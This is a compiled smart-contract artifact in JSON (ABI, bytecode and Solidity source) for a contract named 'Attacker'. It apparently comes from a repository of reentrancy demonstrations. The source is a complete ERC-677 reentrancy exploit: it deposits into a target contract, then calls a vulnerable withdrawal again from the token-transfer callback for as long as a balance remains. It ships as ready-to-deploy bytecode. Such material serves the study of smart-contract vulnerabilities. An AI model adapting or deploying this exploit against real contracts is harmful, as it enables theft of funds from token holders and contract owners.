{
  "contractName": "Attacker",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_target",
          "type": "address"
        }
      ],
      "stateMutability": "payable",
      "type": "constructor",
      "payable": true
    },
    {
      "inputs": [],
      "name": "exploit",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_sender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "_value",
          "type": "uint256"
        },
        {
          "internalType": "bytes",
          "name": "_data",
          "type": "bytes"
        }
      ],
      "name": "onTokenTransfer",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x6080604052604051610797380380610797833981810160405281019061002591906100c1565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061013c565b6000815190506100bb81610125565b92915050565b6000602082840312156100d7576100d6610120565b5b60006100e5848285016100ac565b91505092915050565b60006100f982610100565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600080fd5b61012e816100ee565b811461013957600080fd5b50565b61064c8061014b6000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c806363d9b7701461003b578063a4c0ed3614610045575b600080fd5b610043610061565b005b61005f600480360381019061005a91906103c0565b6101cb565b005b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146100bb57600080fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db060016040518263ffffffff1660e01b81526004016000604051808303818588803b15801561012457600080fd5b505af1158015610138573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e3bb15f060016040518263ffffffff1660e01b81526004016101979190610495565b600060405180830381600087803b1580156101b157600080fd5b505af11580156101c5573d6000803e3d6000fd5b50505050565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231336040518263ffffffff1660e01b8152600401610227919061047a565b602060405180830381600087803b15801561024157600080fd5b505af1158015610255573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610279919061042f565b111561030c5760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e3bb15f060016040518263ffffffff1660e01b81526004016102d99190610495565b600060405180830381600087803b1580156102f357600080fd5b505af1158015610307573d6000803e3d6000fd5b505050505b505050565b600061032461031f846104d5565b6104b0565b9050828152602081018484840111156103405761033f6105c8565b5b61034b848285610554565b509392505050565b600081359050610362816105e8565b92915050565b600082601f83011261037d5761037c6105c3565b5b813561038d848260208601610311565b91505092915050565b6000813590506103a5816105ff565b92915050565b6000815190506103ba816105ff565b92915050565b6000806000606084860312156103d9576103d86105d2565b5b60006103e786828701610353565b93505060206103f886828701610396565b925050604084013567ffffffffffffffff811115610419576104186105cd565b5b61042586828701610368565b9150509250925092565b600060208284031215610445576104446105d2565b5b6000610453848285016103ab565b91505092915050565b61046581610506565b82525050565b61047481610542565b82525050565b600060208201905061048f600083018461045c565b92915050565b60006020820190506104aa600083018461046b565b92915050565b60006104ba6104cb565b90506104c68282610563565b919050565b6000604051905090565b600067ffffffffffffffff8211156104f0576104ef610594565b5b6104f9826105d7565b9050602081019050919050565b600061051182610518565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061054d82610538565b9050919050565b82818337600083830152505050565b61056c826105d7565b810181811067ffffffffffffffff8211171561058b5761058a610594565b5b80604052505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b600080fd5b600080fd5b600080fd5b600080fd5b6000601f19601f8301169050919050565b6105f181610506565b81146105fc57600080fd5b50565b61060881610538565b811461061357600080fd5b5056fea264697066735822122095018ecfe8940bc937b9aedd134cfbb687aef139a00c945a435bb9c14921060564736f6c63430008070033",
  "immutableReferences": {},
  "source": "pragma solidity 0.8.7;\n\ninterface IVictim {\n\tfunction balanceOf(address) external returns(uint256);\n\tfunction deposit() external payable;\n\tfunction vuln(uint256 amount) external;\n}\n\ncontract Attacker {\n\tIVictim private target;\n\taddress private owner;\n\tconstructor(address _target) public payable {\n\t\ttarget = IVictim(_target);\n\t\towner = msg.sender;\n\t}\n\tfunction exploit() external {\n\t\trequire(msg.sender == owner);\n\t\ttarget.deposit{value:1 wei}();\n\t\ttarget.vuln(1);\n\t}\n\tfunction onTokenTransfer(address _sender, uint _value, bytes memory _data) external {\n\t\tif (target.balanceOf(msg.sender) > 0) {\n\t\t\ttarget.vuln(1);\n\t\t}\n\t}\n}\n",
  "sourcePath": "/home/neo/blockfuck/git/all_reentrancy_in_one_repo/erc677_reentrancy/contracts/attacker_contract.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.7+commit.e28d00a7.Emscripten.clang"
  },
  "schemaVersion": "3.2.2-next.0",
  "updatedAt": "2022-11-07T09:17:32.865Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}